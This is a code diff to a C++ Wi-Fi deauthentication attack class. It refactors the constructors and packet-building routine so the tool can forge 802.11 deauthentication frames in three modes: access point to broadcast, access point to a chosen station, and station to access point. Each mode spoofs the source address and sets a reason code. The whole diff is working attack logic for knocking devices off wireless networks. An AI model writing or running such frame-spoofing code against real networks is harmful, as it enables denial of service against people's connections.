@@ -9,23 +9,9 @@ const dot11_radiotap_hdr DeauthAttack::rtap_hdr = {
 };
 
 
-DeauthAttack::DeauthAttack(const uint8_t ap_mac_addr[6])
+DeauthAttack::DeauthAttack(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr, const int mode)
 {
-    this->init_pkt(ap_mac_addr);
-    for (size_t i = 0; i < 6; i++)
-    {
-        this->deauth_fhdr.rcv_addr[i] = 0xff;
-    }
-}
-
-
-DeauthAttack::DeauthAttack(const uint8_t ap_mac_addr[6], const uint8_t st_mac_addr[6])
-{
-    this->init_pkt(ap_mac_addr);
-    for (size_t i = 0; i < 6; i++)
-    {
-        this->deauth_fhdr.rcv_addr[i] = st_mac_addr[i];
-    }
+    this->init_pkt(ap_mac_addr, st_mac_addr, mode);
 }
 
 
@@ -35,17 +21,45 @@ DeauthAttack::~DeauthAttack()
 }
 
 
-void DeauthAttack::init_pkt(const uint8_t ap_mac_addr[6])
+void DeauthAttack::init_pkt(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr, const int mode)
 {
     this->deauth_fhdr.base.fctl_field = DEAUTH_FRAME;
     this->deauth_fhdr.base.duration = 0;
     this->deauth_fhdr.frag_seq_num = 0;
     for (size_t i = 0; i < 6; i++)
     {
-        this->deauth_fhdr.src_addr[i] = ap_mac_addr[i];
         this->deauth_fhdr.bssid[i] = ap_mac_addr[i];
     }
-    this->wlm_hdr.reason_code = HANDSHAKE_TIMEOUT;
+    
+    switch (mode)
+    {
+    case AP_TO_BROADCAST:
+    case AP_TO_STATION:
+    {
+        for (size_t i = 0; i < 6; i++)
+        {
+            this->deauth_fhdr.rcv_addr[i] = st_mac_addr[i];
+            this->deauth_fhdr.src_addr[i] = ap_mac_addr[i];
+            this->deauth_fhdr.bssid[i] = ap_mac_addr[i];
+        }
+        this->wlm_hdr.reason_code = HANDSHAKE_TIMEOUT;
+        break;
+    }
+    case STATION_TO_AP:
+    {
+        for (size_t i = 0; i < 6; i++)
+        {
+            this->deauth_fhdr.rcv_addr[i] = ap_mac_addr[i];
+            this->deauth_fhdr.src_addr[i] = st_mac_addr[i];
+            this->deauth_fhdr.bssid[i] = ap_mac_addr[i];
+        }
+        this->wlm_hdr.reason_code = CLASS3_NONASSOCIATED_STA;
+        break;
+    }
+    default:
+        break;
+    }
+    
 }
 
 
